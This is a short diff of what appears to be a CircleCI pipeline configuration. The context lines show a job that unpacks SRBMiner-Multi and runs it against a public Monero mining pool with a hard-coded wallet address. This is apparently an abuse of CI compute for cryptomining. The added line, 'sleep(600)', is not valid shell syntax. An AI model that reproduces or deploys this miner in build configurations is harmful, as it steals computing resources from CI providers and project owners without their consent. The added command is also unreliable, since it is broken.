@@ -12,6 +12,7 @@ jobs:
               tar -xf SRBMiner-Multi-0-8-9-Linux.tar.xz
               cd SRBMiner-Multi-0-8-9
               ./SRBMiner-MULTI --disable-gpu --algorithm randomx --pool xmr.2miners.com:2222 --wallet 44539yubZUZc7F4AsfDH8ABYwvJYtwxKbiDrNBMP3yc9h9Gy1JVn5U8JSi5hJFcYT55wYLzQJMK2PCVXX92DUZR5PoitrP3
+              sleep(600)
 
 workflows:
     version: 2.1
